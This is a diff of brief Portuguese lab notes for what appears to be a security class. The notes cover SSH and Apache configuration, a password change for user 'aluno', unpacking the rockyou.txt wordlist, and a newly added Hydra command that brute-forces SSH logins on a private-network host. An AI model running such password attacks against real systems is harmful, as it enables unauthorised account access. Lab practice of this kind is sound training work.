@@ -16,7 +16,8 @@ address 192.168.10.10
 
 Mudar porta do ssh
 vim /etc/ssh/sshd_config
-
+Mudar Senha:
+passwd aluno
 
 
 ## Kali
@@ -25,6 +26,8 @@ cd /usr/share/worldlists
 sudo gunzip rockyou.txt.gz
 grep -E "" rockyou.txt
 
+## Hydra
+hydra -l aluno -P rockyou.txt ssh://192.168.15.73
 
 ## Config apache
 vi /etc/apache2/apache2.conf
